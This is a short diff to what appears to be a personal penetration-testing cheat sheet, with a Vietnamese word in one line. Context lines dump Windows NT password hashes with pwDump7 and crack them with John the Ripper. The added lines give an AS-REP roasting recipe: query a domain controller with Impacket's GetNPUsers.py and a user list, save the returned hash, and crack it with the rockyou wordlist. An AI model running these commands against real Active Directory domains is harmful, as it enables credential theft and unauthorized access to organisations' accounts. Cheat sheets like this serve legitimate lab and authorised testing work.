@@ -168,6 +168,13 @@ john file.hash -wordlist=rockyou.txt
 HTLM
 pwDump7.exe > hashes.txt
 john --format=NT hashes.txt
+
+AS-REP
+python3 GetNPUsers.py <AD domain>/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip <ip dc> 
+echo '[HASH]' > joshuahash.txt    hoặc sudo nano joshuahash.txt
+john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
+
+
 ```
 # Privilege Escalation
 ```
